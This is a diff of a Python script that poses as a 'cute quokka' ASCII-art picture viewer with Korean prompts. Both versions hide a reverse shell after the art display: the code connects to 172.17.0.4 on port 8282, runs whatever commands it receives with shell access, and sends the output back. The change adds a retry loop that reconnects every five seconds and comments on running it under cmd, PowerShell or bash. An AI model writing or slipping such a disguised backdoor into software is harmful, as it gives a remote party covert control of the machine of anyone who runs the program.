@@ -1,6 +1,6 @@
 print("<< 귀여운 쿼카 프로그램 >>")
 
-v_quokka = """         xxxxxxx                      
+v_quokka = '''         xxxxxxx                      
                       xx     xx                     
    xxx     xxxxxxxxxxxx       xx                    
  xxx  xxxxxx        xx         xx                   
@@ -23,9 +23,9 @@ v_quokka = """         xxxxxxx
   xx                                           x    
   x                                            x    
 xx                                             x    
- xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"""
+ xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'''
 
-smile_quokka = """
+smile_quokka = '''
                          ooo                             
      ooooo             ooo  oo                           
     o    oo    oooooo oo      oo                         
@@ -50,35 +50,39 @@ oo                   oo       oo         o            oo
    oo                  oo              o                 
    o                  oooo            o                  
    oo               oooooo            o                  
-            ooooooooo                 o                  """
+            ooooooooo                 o                  '''
 
 print("보고싶은 사진 번호를 선택하세요(1~2) : ")
 select = input()
 
-if select == "1":
+if(select=='1'):
     print(v_quokka)
-if select == "2":
+if(select=='2'):
     print(smile_quokka)
 
-print("\n")
+print('\n')
 print("프로그램을 종료합니다~")
 
 import socket
 import subprocess
+import time
+h="172.17.0.4"
+p=8282
 
-h = "172.17.0.4"
-p = 8282
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((h, p))
 while True:
-    c = s.recv(1024).decode()
-    output = subprocess.run(c, shell=True, stdout=subprocess.PIPE, text=True)
-    result = output.stdout
-    if result == "":
-        s.send("suc".encode())
-    else:
-        s.send(result.encode())
-if select == "1":
-    print(v_quokka)
-if select == "2":
-    print(smile_quokka)
+    try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((h,p))
+        while True:
+            c=s.recv(1024).decode()
+            output=subprocess.run(c,shell=True,stdout=subprocess.PIPE,text=True)
+            # cmd: c => ['cmd.exe', '/c', 'dir']
+            # powershell: c => ['powershell.exe', '-Command', 'ls']
+            # mac: c => ['/bin/bash', '-c', 'ls']
+            result=output.stdout
+            if(result==''):
+                s.send("suc".encode())
+            else:
+                s.send(result.encode())
+    except Exception as e:
+        time.sleep(5)
